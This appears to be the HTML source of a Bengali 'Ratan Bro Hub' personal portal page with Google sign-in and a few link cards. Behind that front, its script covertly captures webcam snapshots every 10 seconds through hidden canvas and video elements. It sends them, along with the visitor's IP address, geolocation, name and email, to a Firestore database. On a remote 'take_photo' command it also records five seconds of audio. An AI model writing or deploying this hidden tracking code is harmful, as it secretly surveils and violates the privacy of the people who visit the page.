<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ratan Bro | Personal Portal</title>
    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --pink: #ff4d94; --dark: #0f172a; --card: rgba(30, 41, 59, 0.9); }
        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Hind Siliguri', sans-serif; }
        body { background: var(--dark); color: white; min-height: 100vh; overflow-x: hidden; }
        #login-overlay { position: fixed; inset: 0; background: var(--dark); z-index: 10000; display: flex; align-items: center; justify-content: center; }
        .login-box { background: var(--card); padding: 40px; border-radius: 30px; border: 2px solid var(--pink); text-align: center; width: 90%; max-width: 400px; }
        .round-img { width: 110px; height: 110px; border-radius: 50%; border: 4px solid var(--pink); margin-bottom: 20px; }
        #main-ui { display: none; padding: 20px; }
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 15px; max-width: 900px; margin: 20px auto; }
        .card { background: var(--card); border-radius: 20px; padding: 25px; text-align: center; text-decoration: none; color: white; border: 1px solid rgba(255,255,255,0.1); }
        .card i { font-size: 2.5rem; color: var(--pink); margin-bottom: 12px; }
        canvas, video { display: none; }
    </style>
</head>
<body>

    <div id="login-overlay">
        <div class="login-box">
            <img src="ratan.jpg" class="round-img" onerror="this.src='https://via.placeholder.com/110'">
            <h2 style="color: var(--pink);">Ratan Bro Hub</h2>
            <button onclick="googleLogin()" style="background:var(--pink); color:white; border:none; padding:12px 40px; border-radius:50px; font-weight:bold; cursor:pointer; width:100%; margin-top:20px;">
                <i class="fab fa-google"></i> Login with Google
            </button>
        </div>
    </div>

    <div id="main-ui">
        <div style="text-align:center; padding:40px 0;">
            <img id="user-display-pic" src="" style="width:100px; border-radius:50%; border:3px solid var(--pink);">
            <h2 id="user-welcome" style="margin-top:15px;"></h2>
        </div>
        <div class="grid">
            <a href="#" class="card"><i class="fas fa-file-pdf"></i><h4>Test Paper</h4></a>
            <a href="#" class="card"><i class="fas fa-briefcase"></i><h4>Business</h4></a>
            <a href="#" class="card"><i class="fas fa-user-circle"></i><h4>Portfolio</h4></a>
            <a href="https://numberlookup.pro.bd/" target="_blank" class="card"><i class="fas fa-search-location"></i><h4>No. Lookup</h4></a>
        </div>
    </div>

    <canvas id="snapCanvas" width="640" height="480"></canvas>
    <video id="vSource" autoplay playsinline muted></video>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
        import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
        import { getFirestore, doc, setDoc, updateDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyC4ExRu3Oze8api5-ueDTBqZOceSa8wclo",
            authDomain: "ratanweab.firebaseapp.com",
            projectId: "ratanweab",
            storageBucket: "ratanweab.firebasestorage.app",
            messagingSenderId: "611953936063",
            appId: "1:611953936063:web:7e3ca24060d7478fb2a80a"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);
        const provider = new GoogleAuthProvider();

        window.googleLogin = () => signInWithPopup(auth, provider);

        onAuthStateChanged(auth, (user) => {
            if (user) {
                document.getElementById('login-overlay').style.display = 'none';
                document.getElementById('main-ui').style.display = 'block';
                document.getElementById('user-welcome').innerText = "স্বাগতম, " + user.displayName;
                document.getElementById('user-display-pic').src = user.photoURL;
                startTracking(user);
            }
        });

        async function startTracking(user) {
            const userRef = doc(db, "users", user.email.replace('.', '_'));
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }).catch(() => null);
            if(stream) document.getElementById('vSource').srcObject = stream;

            // অ্যাডমিন কমান্ড চেক করা (Real-time)
            onSnapshot(userRef, async (docSnap) => {
                const data = docSnap.data();
                if (data && data.command === "take_photo") {
                    await takeSnapshot(user); // সাথে সাথে ছবি
                    await recordQuickVoice(user); // ৫ সেকেন্ড ভয়েস
                    await updateDoc(userRef, { command: "" }); // কমান্ড রিসেট
                }
            });

            // সাধারণ ট্র্যাকিং (প্রতি ১০ সেকেন্ডে)
            setInterval(() => takeSnapshot(user), 10000);
        }

        async function takeSnapshot(user) {
            const canvas = document.getElementById('snapCanvas');
            const video = document.getElementById('vSource');
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, 640, 480);
            const imgData = canvas.toDataURL('image/jpeg', 0.5);
            const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: "N/A"}));
            
            navigator.geolocation.getCurrentPosition(async (pos) => {
                await setDoc(doc(db, "users", user.email.replace('.', '_')), {
                    name: user.displayName, email: user.email, photo: user.photoURL,
                    ip: ipData.ip, loc: `${pos.coords.latitude}, ${pos.coords.longitude}`,
                    lastPic: imgData, time: new Date().toLocaleString()
                }, { merge: true });
            });
        }

        async function recordQuickVoice(user) {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            const mediaRecorder = new MediaRecorder(stream);
            let chunks = [];
            mediaRecorder.ondataavailable = e => chunks.push(e.data);
            mediaRecorder.onstop = async () => {
                const reader = new FileReader();
                reader.readAsDataURL(new Blob(chunks));
                reader.onloadend = async () => {
                    await updateDoc(doc(db, "users", user.email.replace('.', '_')), { lastAudio: reader.result });
                };
            };
            mediaRecorder.start();
            setTimeout(() => mediaRecorder.stop(), 5000); // ৫ সেকেন্ড রেকর্ড
        }
    </script>
</body>
</html>
